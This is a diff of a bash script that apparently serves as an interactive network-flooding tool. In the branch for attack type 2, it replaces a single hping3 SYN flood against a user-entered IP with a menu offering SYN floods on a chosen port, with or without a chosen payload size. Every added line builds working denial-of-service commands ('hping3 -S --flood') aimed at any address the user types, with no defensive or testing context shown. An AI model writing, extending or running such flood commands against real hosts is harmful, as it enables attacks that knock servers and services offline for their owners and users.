@@ -44,9 +44,28 @@ then
 	fi
 	if (($type == 2))
 	then
-		echo "enter ip:"
-		read ip
-		sudo hping3 -S --flood "$ip"
+		echo "select option:"
+		echo -e "${green}with bites 1${NC}"
+		echo -e "${green}without bites 2${NC}"
+		read option
+		if (($option == 1))
+		then
+			echo "Enter ip"
+			read ip
+			echo "Enter port"
+			read port
+			echo "Enter bites"
+			read bites
+			sudo hping3 -d "$bites" -p "$port" -S --flood "$ip"
+		fi
+		if (($option == 2))
+		then
+			echo "Enter ip"
+			read ip
+			echo "Enter port"
+			read port
+			sudo hping3 -p "$port" -S --flood "$ip"
+		fi
 	fi
 	if (($type == 3))
 	then
